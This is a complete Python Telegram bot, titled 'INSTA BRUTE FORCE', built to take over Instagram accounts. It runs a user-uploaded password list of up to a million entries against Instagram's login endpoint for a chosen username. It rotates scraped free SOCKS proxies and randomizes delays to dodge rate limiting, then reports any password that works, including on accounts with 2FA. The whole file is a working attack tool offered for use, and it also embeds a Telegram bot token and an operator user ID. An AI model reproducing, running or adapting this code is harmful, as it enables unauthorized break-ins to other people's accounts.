import os, sys, re, zipfile, random, time, string, json
import urllib.request, threading, shutil
from datetime import datetime

try:
    from telegram import Update, ForceReply, Bot
    from telegram.ext import (
        Updater, CommandHandler, MessageHandler,
        Filters, ConversationHandler
    )
    TELEGRAM_OK = True
except ImportError:
    TELEGRAM_OK = False
    print("\n❌ python-telegram-bot==13.15 install karo:")
    print("pip install python-telegram-bot==13.15")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("\n❌ requests install karo: pip install requests\n")
    sys.exit(1)

GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
BLUE = '\033[94m'; CYAN = '\033[96m'; WHITE = '\033[97m'
PURPLE = '\033[95m'; BOLD = '\033[1m'; NC = '\033[0m'

BOT_TOKEN = "8847696249:AAEyRLFy5_RgsOvXDEiCumqfECOHwPLwB1E"
ALLOWED_USER_IDS = [8610100310]

USERNAME_WAIT, FILE_WAIT = range(2)

user_sessions = {}
pending_requests = {}

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.proxy_index = 0

    def fetch(self):
        print(f"{BLUE}[*] Fetching proxies...{NC}")
        all_p = set()
        sources = [
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        ]
        for src in sources:
            try:
                req = urllib.request.Request(src, headers={'User-Agent': 'Mozilla/5.0'})
                resp = urllib.request.urlopen(req, timeout=15)
                data = resp.read().decode()
                for line in data.strip().split('\n'):
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        line = re.sub(r'^(socks5://|socks4://|http://|https://)', '', line)
                        if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line):
                            all_p.add(line)
            except:
                pass
        self.proxies = list(all_p)
        random.shuffle(self.proxies)
        self.proxy_index = 0
        print(f"{GREEN}[+] Loaded {len(self.proxies):,} proxies{NC}")
        return len(self.proxies)

    def get(self):
        if not self.proxies:
            self.fetch()
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        if self.proxy_index >= len(self.proxies):
            self.proxy_index = 0
            random.shuffle(self.proxies)
        return {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}

proxy_mgr = ProxyManager()

def try_login(session, username, password, proxy):
    ua = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/125.0 Mobile Safari/537.36"
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        r = session.get("https://www.instagram.com/accounts/login/", headers=headers, proxies=proxy, timeout=20)
        csrf = re.search(r'"csrf_token":"([^"]+)"', r.text)
        csrf = csrf.group(1) if csrf else r.cookies.get("csrftoken")
        if not csrf:
            return {'ok': False, 'rotate': True}
        ts = int(time.time())
        data = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false",
        }
        h2 = headers.copy()
        h2["X-CSRFToken"] = csrf
        r2 = session.post("https://www.instagram.com/accounts/login/ajax/", data=data, headers=h2, proxies=proxy, timeout=20)
        j = r2.json()
        if j.get("authenticated"):
            return {'ok': True, 'found': True, 'pwd': password, 'username': username}
        if j.get("two_factor_required"):
            return {'ok': True, 'found': True, 'pwd': password, 'twofa': True, 'username': username}
        if "wait a few minutes" in str(j):
            return {'ok': False, 'rotate': True}
        return {'ok': True, 'found': False, 'rotate': False}
    except:
        return {'ok': False, 'rotate': True}

def load_passwords_from_file(file_path):
    if not os.path.exists(file_path):
        return None
    size = os.path.getsize(file_path)
    pwds = []
    ext = os.path.splitext(file_path)[1].lower()
    try:
        if ext == '.zip':
            with zipfile.ZipFile(file_path, 'r') as zf:
                for name in zf.namelist():
                    if name.endswith('.txt'):
                        with zf.open(name) as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            pwds = [l.strip() for l in content.split('\n') if l.strip()]
                        break
        elif ext == '.txt':
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                pwds = [l.strip() for l in f if l.strip()]
        else:
            return None
        if not pwds:
            return None
        pwds = list(dict.fromkeys(pwds))
        return pwds
    except MemoryError:
        return pwds if pwds else None
    except:
        return None

def run_attack(username, passwords, chat_id, context, progress_msg_id):
    session = requests.Session()
    total = len(passwords)
    last_update = 0.0

    for i, pwd in enumerate(passwords):
        state = user_sessions.get(chat_id)
        if state and state.get('cancel_flag'):
            session.close()
            return (False, None, False, i, total)

        proxy = proxy_mgr.get()
        current = i + 1
        pct = int(current / total * 100)
        now = time.time()

        if current == 1 or (current % 50 == 0 and now - last_update > 2):
            last_update = now
            elapsed = now - state.get('start_time', now)
            rate = current / elapsed if elapsed > 0 else 0
            remaining = (total - current) / rate if rate > 0 else 0
            bar = '█' * int(10 * pct / 100) + '░' * (10 - int(10 * pct / 100))
            text = f"⚙️ Target: {username}\n\n{bar}  {pct}%\n📊 {current:,}/{total:,}\n⏱ {elapsed:.0f}s  ⏳ ~{remaining:.0f}s\n🔑 {pwd[:15]}..."
            try:
                context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg_id, text=text)
            except:
                pass

        result = try_login(session, username, pwd, proxy)
        if result.get('found'):
            session.close()
            return (True, pwd, result.get('twofa', False), current, total)

        delay = random.uniform(0.3, 0.8) if not result.get('rotate') else random.uniform(0.5, 1.2)
        time.sleep(delay)

    session.close()
    return (False, None, False, total, total)

def download_telegram_file(bot, file_id, save_path):
    try:
        f = bot.get_file(file_id)
        f.download(save_path)
        return True
    except:
        try:
            f = bot.get_file(file_id)
            urllib.request.urlretrieve(f.file_path, save_path)
            return True
        except:
            return False

def cmd_start(update, context):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id not in ALLOWED_USER_IDS:
        update.message.reply_text("⛔ Unauthorized.")
        return ConversationHandler.END
    if chat_id in user_sessions and user_sessions[chat_id].get('running'):
        update.message.reply_text("⚠️ Attack running! Use /cancel")
        return ConversationHandler.END
    if not proxy_mgr.proxies:
        update.message.reply_text("🔄 Loading proxies...")
        proxy_mgr.fetch()
    reply_markup = ForceReply(selective=True, input_field_placeholder="Username...")
    update.message.reply_text("🔐 *Instagram Brute Force*\n\nEnter the *username*:\n\n_(/cancel to stop)_", parse_mode='Markdown', reply_markup=reply_markup)
    return USERNAME_WAIT

def cmd_get_username(update, context):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id not in ALLOWED_USER_IDS:
        return ConversationHandler.END
    username = update.message.text.strip()
    if not username or ' ' in username or len(username) < 2:
        update.message.reply_text("❌ Invalid username. Try again:")
        return USERNAME_WAIT
    pending_requests[chat_id] = {'username': username}
    update.message.reply_text(f"✅ *{username}*\n\nNow send password list 📁\n.txt or .zip\n\n_(/cancel to stop)_", parse_mode='Markdown')
    return FILE_WAIT

def cmd_get_file(update, context):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if user_id not in ALLOWED_USER_IDS:
        return ConversationHandler.END
    if chat_id not in pending_requests:
        update.message.reply_text("❌ Session expired. Use /start")
        return ConversationHandler.END
    username = pending_requests[chat_id]['username']
    if not update.message.document:
        update.message.reply_text("❌ Send a .txt or .zip file")
        return FILE_WAIT
    doc = update.message.document
    fname = doc.file_name or "pass.txt"
    ext = os.path.splitext(fname)[1].lower()
    if ext not in ('.txt', '.zip'):
        update.message.reply_text(f"❌ Unsupported: {ext}. Use .txt or .zip")
        return FILE_WAIT
    if doc.file_size > 100 * 1024 * 1024:
        update.message.reply_text("❌ Max 100MB")
        return FILE_WAIT
    base_dir = os.path.dirname(os.path.abspath(__file__))
    save_path = os.path.join(base_dir, f"list_{chat_id}{ext}")
    update.message.reply_text("📥 Downloading...")
    if not download_telegram_file(context.bot, doc.file_id, save_path):
        update.message.reply_text("❌ Download failed")
        return FILE_WAIT
    update.message.reply_text("📖 Loading passwords...")
    passwords = load_passwords_from_file(save_path)
    if not passwords:
        update.message.reply_text("❌ No passwords found")
        try: os.remove(save_path)
        except: pass
        return FILE_WAIT
    if len(passwords) > 1000000:
        passwords = passwords[:1000000]
        update.message.reply_text("⚠️ Trimmed to 1M passwords")
    user_sessions[chat_id] = {'running': True, 'cancel_flag': False, 'username': username, 'passwords': passwords, 'start_time': time.time(), 'progress_msg_id': None}
    msg = update.message.reply_text(f"🚀 Attacking {username}...")
    user_sessions[chat_id]['progress_msg_id'] = msg.message_id
    found, pwd, twofa, attempts, total = run_attack(username, passwords, chat_id, context, msg.message_id)
    elapsed = time.time() - user_sessions[chat_id]['start_time']
    bot_user = context.bot.get_me().username or "Bot"
    if found:
        tag = " (2FA)" if twofa else ""
        result = f"✅ *FOUND!*\n👤 `{username}`\n🔑 `{pwd}`{tag}\n📊 {attempts:,}/{total:,}\n⏱ {elapsed:.0f}s\n\n👤 @{bot_user}"
    else:
        result = f"❌ *Not found*\n👤 `{username}`\n📊 {total:,} tested\n⏱ {elapsed:.0f}s\n\n👤 @{bot_user}"
    try:
        context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=result, parse_mode='Markdown')
    except:
        update.message.reply_text(result, parse_mode='Markdown')
    user_sessions[chat_id]['running'] = False
    if chat_id in pending_requests: del pending_requests[chat_id]
    try: os.remove(save_path)
    except: pass
    return ConversationHandler.END

def cmd_cancel(update, context):
    chat_id = update.effective_chat.id
    if chat_id in pending_requests: del pending_requests[chat_id]
    if chat_id in user_sessions and user_sessions[chat_id].get('running'):
        user_sessions[chat_id]['cancel_flag'] = True
        update.message.reply_text("🛑 Cancelling...")
    else:
        update.message.reply_text("Nothing to cancel. Use /start")

def cmd_status(update, context):
    if update.effective_user.id not in ALLOWED_USER_IDS:
        update.message.reply_text("⛔ Unauthorized.")
        return
    chat_id = update.effective_chat.id
    running = "🟢 Yes" if user_sessions.get(chat_id, {}).get('running') else "🔴 No"
    update.message.reply_text(f"🤖 *Status*\n▶️ {running}\n🌐 {len(proxy_mgr.proxies):,} proxies\n\n/start /cancel /help", parse_mode='Markdown')

def cmd_help(update, context):
    if update.effective_user.id not in ALLOWED_USER_IDS:
        update.message.reply_text("⛔ Unauthorized.")
        return
    update.message.reply_text("*/start* - Start\n*/cancel* - Stop\n*/status* - Status\n*/proxies* - Refresh\n\n1️⃣ /start\n2️⃣ Username\n3️⃣ Upload .txt/.zip", parse_mode='Markdown')

def cmd_proxies(update, context):
    if update.effective_user.id not in ALLOWED_USER_IDS:
        update.message.reply_text("⛔ Unauthorized.")
        return
    update.message.reply_text("🔄 Refreshing...")
    c = proxy_mgr.fetch()
    update.message.reply_text(f"✅ {c:,} proxies")

def unknown(update, context):
    update.message.reply_text("❓ Unknown. Use /help")

def main():
    print(f"{PURPLE}{BOLD}INSTA BRUTE FORCE - PYDROID 3{NC}")
    print(f"{BLUE}[*] Loading proxies...{NC}")
    proxy_mgr.fetch()
    print(f"{GREEN}[+] Starting bot...{NC}")
    updater = Updater(token=BOT_TOKEN, request_kwargs={'read_timeout': 30, 'connect_timeout': 30})
    dp = updater.dispatcher
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", cmd_start)],
        states={
            USERNAME_WAIT: [MessageHandler(Filters.text & (~Filters.command), cmd_get_username)],
            FILE_WAIT: [MessageHandler(Filters.document, cmd_get_file), MessageHandler(Filters.text & (~Filters.command), cmd_get_file)],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
    )
    dp.add_handler(conv)
    dp.add_handler(CommandHandler("cancel", cmd_cancel))
    dp.add_handler(CommandHandler("status", cmd_status))
    dp.add_handler(CommandHandler("help", cmd_help))
    dp.add_handler(CommandHandler("proxies", cmd_proxies))
    dp.add_handler(MessageHandler(Filters.command, unknown))
    bot_user = BOT_TOKEN.split(':')[0]
    print(f"\n{GREEN}✅ BOT RUNNING @{bot_user}_bot{NC}")
    print(f"Commands: /start /cancel /status /help /proxies\n")
    updater.start_polling(timeout=30)
    updater.idle()

if __name__ == '__main__':
    main()
